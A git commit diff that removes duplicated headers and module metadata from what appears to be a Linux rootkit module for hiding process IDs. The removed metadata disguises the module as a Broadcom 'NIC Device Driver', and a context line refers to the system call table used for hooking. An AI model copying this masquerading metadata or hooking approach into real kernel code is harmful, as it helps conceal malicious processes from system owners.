550e792160fb7ebd35617548226881d09c213608
Angus <44337835+Angus-C-git@users.noreply.github.com>
2020-07-19 13:41:23 +1000

    Remove: Duplicated headers

--- code_lib/pid_hiding/main.c
+++ code_lib/pid_hiding/main.c
@@ -23,28 +23,6 @@ MODULE_VERSION("1.0");
 
 // ------------------------------------------------------------------------------ //
 
-
-
-//Neccessary header files
-#include <linux/init.h> //macros
-#include <linux/module.h> 
-#include <linux/syscalls.h>
-#include <linux/kallsyms.h> //Call system
-#include <linux/slab.h>
-#include <linux/kern_levels.h>
-#include <linux/gfp.h>
-#include <asm/unistd.h>
-#include <asm/paravirt.h>
-#include <linux/kernel.h> //Kernel 
-
-
-//Assists with kernel taint warnings etc
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Broadcom");
-MODULE_DESCRIPTION("NIC Device Driver");
-MODULE_VERSION("1.0");
-
-
 unsigned long **SYS_CALL_TABLE;
 
 /*
